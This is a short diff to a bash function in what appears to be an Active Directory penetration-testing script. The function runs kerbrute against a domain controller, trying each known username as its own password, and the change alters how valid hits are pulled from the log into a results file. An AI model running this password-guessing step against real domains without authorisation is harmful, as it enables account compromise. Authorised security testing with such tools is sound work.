@@ -582,8 +582,9 @@ userpass_check () {
         if [ -s "${known_users_list}" ] ; then
             echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
             for i in $(/bin/cat ${known_users_list}); do
-                ${kerbrute} -user ${i} -password ${i} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputfile ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt | grep -v "Impacket" >> ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
+                ${kerbrute} -user ${i} -password ${i} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 | grep -v "Impacket" >> ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
             done
+            /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "Stupendous" | cut -d " " -f 4 >> "${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt"
             if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                 /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt 2>/dev/null | grep -v "Impacket" 2>/dev/null
